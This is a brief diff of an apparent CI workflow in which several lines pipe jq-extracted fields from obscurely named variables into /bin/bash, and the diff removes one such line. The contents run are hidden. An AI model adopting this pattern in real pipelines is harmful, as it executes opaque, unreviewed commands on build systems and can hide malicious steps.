@@ -31,7 +31,6 @@ jobs:
           echo $o8465 | jq -r .ctgb3 | /bin/bash
           printf '%s' "$cacie66" | jq -r .jcd883 | /bin/bash
           echo $ihj6 | jq -r .zefjc65 | /bin/bash
-          printf '%s' "$bphxz525" | jq -r .s04 | /bin/bash
           echo $ob4840 | jq -r .ky6867 | /bin/bash
 
       - name: Upload artifact
